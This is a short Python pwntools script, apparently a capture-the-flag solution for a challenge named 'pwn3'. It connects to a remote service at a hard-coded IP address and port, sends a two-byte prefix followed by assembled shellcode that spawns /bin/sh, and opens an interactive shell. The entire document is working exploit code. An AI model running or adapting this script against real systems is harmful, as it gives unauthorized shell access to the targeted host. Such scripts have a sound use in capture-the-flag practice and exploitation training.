from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
# p = process('./pwn3')120.27.3.220 10012
p = remote('120.27.3.220', 10012)
p.recv()
p.sendline('\x76\x00' + asm(shellcraft.sh()))
p.interactive()
